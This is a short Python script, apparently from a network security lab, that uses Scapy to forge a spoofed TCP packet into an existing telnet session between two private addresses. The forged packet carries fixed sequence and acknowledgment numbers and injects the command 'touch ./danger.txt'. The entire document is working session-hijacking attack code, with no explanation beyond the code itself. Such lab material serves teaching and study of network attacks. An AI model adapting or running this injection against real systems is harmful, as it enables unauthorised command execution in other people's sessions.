#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=54286, dport=23, flags="A", seq=1435181587, ack=3653825513)
data = "touch ./danger.txt\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
sniff()